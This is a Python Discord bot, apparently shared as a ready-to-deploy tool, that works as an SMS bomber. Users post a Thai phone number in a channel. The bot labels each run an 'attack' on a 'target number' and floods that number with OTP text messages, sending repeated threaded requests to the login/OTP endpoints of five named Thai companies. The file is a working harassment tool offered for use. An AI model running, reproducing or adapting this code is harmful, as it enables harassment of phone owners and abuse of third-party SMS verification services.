import interactions
import platform
import os
import requests
import flask
from interactions import Intents
from pystyle import *
from concurrent.futures import ThreadPoolExecutor
from replit import web

from myserver import server_on

# Config

token = "your_token_here"  # โทเคนบอท

ch_id = "your_ch_id"  # ช่องสำหรับยิงเบอร์

log_ch = "your_log_ch"  # ช่องสำหรับดูตอนยิง

backend_ch = "your_backend_ch"  # ช่องหลังบ้าน ( หากมีบัคหรือข้อผิดพลาด บอทจะส่งมาห้องนี้นะค้าบ )

# Embed Config

m_title = "USERSHOP"  # หัวข้อบนสุด Embed

m_small = "https://media.discordapp.net/attachments/1383240749264404541/1383449000182808778/1275_20250614183140.png?ex=684f7d88&is=684e2c08&hm=96e092be5fbce28bf9a4e776ed534e74778ea59eccfbdca0ac642c0234ec230b&=&format=webp&quality=lossless&width=671&height=671"  # รูปไอคอนเล็กๆ

m_big = "https://media.discordapp.net/attachments/1383240749264404541/1383449000182808778/1275_20250614183140.png?ex=684f7d88&is=684e2c08&hm=96e092be5fbce28bf9a4e776ed534e74778ea59eccfbdca0ac642c0234ec230b&=&format=webp&quality=lossless&width=671&height=671"  # รูปใหญ่ เช่น ปกดิส

# Attack Config

amount = "30"  # จำนวนรอบยิง

usershop = interactions.Client(token=token, intents=Intents.ALL)

# Hosting

app = flask.Flask(__name__)

@app.route("/")
def index():
  return "Host by USERSHOP"

@interactions.listen()
async def on_error(error):
  bug_embed = interactions.Embed(title=f"**{m_title} Bug ( Evo )**",
                                   description="_ _",
                                   color=0xff3860)

  bug_embed.add_field(name="> Bug ( SRC )",
                      value=f"_ _\n```\n{error.source}\n```\n_ _")

  bug_embed.add_field(name="> Bug ( Error )",
                      value=f"_ _\n```\n{error.error}\n```\n_ _")

  await usershop.get_channel(backend_ch).send(embeds=bug_embed)


@interactions.listen()
async def on_ready():
  usershop_evo = """

    ░▒█▀▄▀█░█▀▀░▄▀▀▄░█▀▀▄░█░░░█░░░▒█▀▀▀░▄░░░▄░▄▀▀▄
    ░▒█▒█▒█░█▀▀░█░░█░█▄▄█░▀▄█▄▀░░░▒█▀▀▀░░█▄█░░█░░█
    ░▒█░░▒█░▀▀▀░░▀▀░░▀░░▀░░▀░▀░░░░▒█▄▄▄░░░▀░░░░▀▀░


    """

  usershop_send = "             [ > ] Send How to use Done !         "
  usershop_send_fail = "             [ > ] Send How to use Fail :(         "
  usershop_ready = "             [ > ]   Ready to use SMS !          "

  if platform.system() == 'Windows':

    os.system('cls & title USERSHOP Sms ( Evo )')
    print(Colorate.Horizontal(Colors.cyan_to_green, usershop_evo))

    ch = await usershop.fetch_channel(channel_id=ch_id)

    ui_embed = interactions.Embed(title=f"**{m_title} Sms ( Evo )**",
                                   description="_ _",
                                   color=0x5b45ff)

    ui_embed.add_field(
      name="> วิธีใช้งาน",
      value="_ _\n`❓`: พิมเบอร์เริ่มต้นด้วย 0 เพื่อใช้งาน !\n_ _\n_ _")

    ui_embed.set_thumbnail(f"{m_small}")
    ui_embed.set_images(f"{m_big}")
    ui_embed.set_footer("© 2023 USERSHOP All rights reserved")

    try:
      await ch.send(embeds=ui_embed)
      print(Colorate.Horizontal(Colors.cyan_to_blue, usershop_send))
      print(" ")
      print(Colorate.Horizontal(Colors.yellow_to_red, usershop_ready))
    except:
      print(Colorate.Horizontal(Colors.yellow_to_red, usershop_send_fail))
      print(" ")

  else:

    os.system('clear')
    print(Colorate.Horizontal(Colors.cyan_to_green, usershop_evo))
    ch = await usershop.fetch_channel(channel_id=ch_id)

    ui_embed = interactions.Embed(title=f"**{m_title} Sms ( Evo )**",
                                   description="_ _",
                                   color=0x5b45ff)

    ui_embed.add_field(
      name="> วิธีใช้งาน",
      value="_ _\n`❓`: พิมเบอร์เริ่มต้นด้วย 0 เพื่อใช้งาน !\n_ _\n_ _")

    ui_embed.set_thumbnail(f"{m_small}")
    ui_embed.set_images(f"{m_big}")
    ui_embed.set_footer("© 2023 USERSHOP All rights reserved")

    try:
      await ch.send(embeds=ui_embed)
      print(Colorate.Horizontal(Colors.cyan_to_blue, usershop_send))
      print(" ")
      print(Colorate.Horizontal(Colors.yellow_to_red, usershop_ready))
    except:
      print(Colorate.Horizontal(Colors.yellow_to_red, usershop_send_fail))
      print(" ")


@interactions.listen()
async def on_message_create(event):
  if event.message.author.bot is True:
    return

  else:

    if str(event.message.channel.id) == str(ch_id):
      await event.message.delete()
      phone = event.message.content

      if phone.startswith("0"):
        check = len(phone)

        if check < 3:
          low = await usershop.fetch_channel(channel_id=log_ch)

          low_embed = interactions.Embed(title=f"**{m_title} Low ( Evo )**",
                                         description="_ _",
                                         color=0xf51c0c)

          low_embed.add_field(
            name="> สถานะ",
            value="_ _\n`❌`: เบอร์มีค่าน้อยกว่า 3 ตัวอักษร\n_ _")

          low_embed.add_field(
            name="> รายละเอียด",
            value=f"_ _\n`❓`: คุณใส่มาแค่ `{check}` จาก 3 ตัวอักษร\n_ _\n_ _")

          low_embed.set_footer("© 2023 USERSHOP All rights reserved")

          await low.send(f"<@{event.message.author.id}>", embeds=low_embed)

        elif check > 10:
          high = await usershop.fetch_channel(channel_id=log_ch)

          high_embed = interactions.Embed(title=f"**{m_title} High ( Evo )**",
                                         description="_ _",
                                         color=0xf51c0c)

          high_embed.add_field(
            name="> สถานะ",
            value="_ _\n`❌`: เบอร์มีค่ามากกว่า 10 ตัวอักษร\n_ _\n_ _")

          high_embed.add_field(
            name="> รายละเอียด",
            value=f"_ _\n`❓`: คุณใส่มา `{check}` จาก 10 ตัวอักษร\n_ _\n_ _")

          high_embed.set_footer("© 2023 USERSHOP All rights reserved")

          await high.send(f"<@{event.message.author.id}>", embeds=high_embed)

        else:

          attack = await usershop.fetch_channel(channel_id=log_ch)

          attack_embed = interactions.Embed(
            title=f"**{m_title} Attack ( Evo )**",
            description="_ _",
            color=0xffcf8c)

          attack_embed.add_field(name="> สถานะ",
                                   value="_ _\n`🟠`: กำลังเริ่มยิง\n_ _\n_ _")

          attack_embed.add_field(name="> เบอร์เป้าหมาย",
                                   value=f"_ _\n`📞`: ||{phone}||\n_ _\n_ _")

          attack_embed.add_field(name="> จำนวนการยิง",
                                   value=f"_ _\n`🔔`: `{amount}` รอบ\n_ _\n_ _")

          attack_embed.set_footer("© 2023 USERSHOP All rights reserved")

          await attack.send(f"<@{event.message.author.id}>",
                            embeds=attack_embed)

          i = 0
          i += 1

          while i < int(amount):
            i += 1

            threading = ThreadPoolExecutor(max_workers=int(1000))

            threading.submit(meoaw_01, phone)

            threading.submit(meoaw_02, phone)

            threading.submit(meoaw_03, phone)

            threading.submit(meoaw_04, phone)

            threading.submit(meoaw_05, phone)

          else:

            done = await usershop.fetch_channel(channel_id=log_ch)

            done_embed = interactions.Embed(
              title=f"**{m_title} Attack ( Evo )**",
              description="_ _",
              color=0x8cff94)

            done_embed.add_field(name="> สถานะ",
                                   value="_ _\n`🟢`: ยิงเสร็จแล้ว !\n_ _\n_ _")

            done_embed.add_field(name="> เบอร์เป้าหมาย",
                                   value=f"_ _\n`📞`: ||{phone}||\n_ _\n_ _")

            done_embed.add_field(name="> จำนวนการยิง",
                                   value=f"_ _\n`🔔`: `{amount}` รอบ\n_ _\n_ _")

            done_embed.add_field(name="> บูสยิง ( Evo )",
                                   value=f"_ _\n`✨`: `x2` รอบ\n_ _\n_ _")

            done_embed.set_footer("© 2023 USERSHOP All rights reserved")

            await done.send(f"<@{event.message.author.id}>", embeds=done_embed)

      else:

        nsw = await usershop.fetch_channel(channel_id=log_ch)

        nsw_embed = interactions.Embed(title=f"**{m_title} Attack ( Evo )**",
                                      description="_ _",
                                      color=0xff928a)

        nsw_embed.add_field(name="> สถานะ",
                            value="_ _\n`🛑`: เกิดข้อผิดพลาด\n_ _\n_ _")

        nsw_embed.add_field(
          name="> ข้อผิดพลาด",
          value=f"_ _\n`🟥`: คุณใส่เบอร์ที่ไม่ได้เริ่มต้นด้วย `0` !\n_ _\n_ _")

        nsw_embed.add_field(name="> ข้อความ",
                            value=f"_ _\n`🩸`: `{phone}`\n_ _\n_ _")

        nsw_embed.set_footer("© 2023 USERSHOP All rights reserved")

        await nsw.send(f"<@{event.message.author.id}>", embeds=nsw_embed)


def meoaw_01(phone):
  auth01 = requests.post("https://www.carsome.co.th/website/login/sendSMS",
                         json={"username": f"{phone}",
                                "optType": 0})

  print(" ")
  print(f"[ USERSHOP API ] # Carsome | {auth01.status_code}")
  print(" ")


def meoaw_02(phone):
  auth02 = requests.post("https://api-sso.ch3plus.com/user/request-otp",
                         json={"tel": f"{phone}",
                                "type": "login"})

  print(" ")
  print(f"[ USERSHOP API ] # 3 Plus | {auth02.status_code}")
  print(" ")


def meoaw_03(phone):
  auth03 = requests.post(
    f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}"
  )

  print(" ")
  print(f"[ USERSHOP API ] # True v1 | API: 03 | Status: {auth03.status_code}")
  print(" ")


def meoaw_04(phone):
  auth04 = requests.post(
    "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
    data={"username": phone})

  print(" ")
  print(f"[ USERSHOP API ] # True v2 | API: 04 | Status: {auth04.status_code}")
  print(" ")


def meoaw_05(phone):
  auth05 = requests.post(
    "https://www.theconcert.com/rest/request-otp",
    headers={
      "x-xsrf-token":
      "your_token",
      "x-csrf-token": "your_csrf",
      "cookie": "your_cookies",
      "content-type": "application/json;charset=UTF-8"
    },
    json={"mobile": phone,"country_code": "TH","lang": "th","channel": "sms","digit": 4})

  print(" ")
  print(f"[ USERSHOP API ] # TCOTP | API: 05 | Status: {auth05.status_code}")
  print(" ")

server_on

usershop.run(os.getenv('TOKEN'))
